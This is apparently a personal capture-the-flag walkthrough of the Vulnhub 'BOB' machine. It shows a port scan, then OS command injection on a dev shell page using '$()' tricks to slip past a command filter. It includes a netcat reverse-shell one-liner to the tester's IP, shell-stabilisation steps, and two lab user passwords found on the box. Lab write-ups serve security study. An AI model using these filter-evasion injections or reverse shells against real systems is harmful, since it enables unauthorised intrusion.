#os-command-injection 
# Nmap:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 4 disallowed entries 
| /login.php /dev_shell.php /lat_memo.html 
|_/passwords.html
```
# PORT 80
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926204823.png]]
### dev_shell.php:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926204946.png]]
os-command injection -> same thing happened in :
[[CTF/Cyber-Heroines/Cyber Heriones|Cyber Heriones]] ctf 
```
l$()s
```
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926205147.png]]
ping also working:
```
pin$()g 19$()2.168.211.130 -c 4
```
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926205621.png]]
# WE ARE IN BABY!!!
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926205750.png]]
```
n$()c 19$()2.168.211.130 4$()43 -e /bi$()n/ba$()sh 
```

we stabilize the shell :
***
step 1:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

step 2:
do `ctrl+z` your main system terminal should have opened and then write this:
```
stty raw -echo; fg
```

then press `enter` two times , your terminal for the machine should be back , also type this to get some env variables like clear in that machine:
```
export TERM=xterm
```
***
THERE ARE 4 USERS:
* elliot
* jc
* bob
* seb
### user elliot:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926210716.png]]

### User bob:
In the home folder of this user:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926211216.png]]
seb:`T1tanium_Pa$$word_Hack3rs_Fear_M3`
jc:`Qwerty`

the user jc had:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926211634.png]]
they ask us for the identity to use:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926211740.png]]
tried gtfo'ing inside but didn't work:
![[walkthroughs/Vulnhub/BOB/IMG/Pasted image 20230926211905.png]]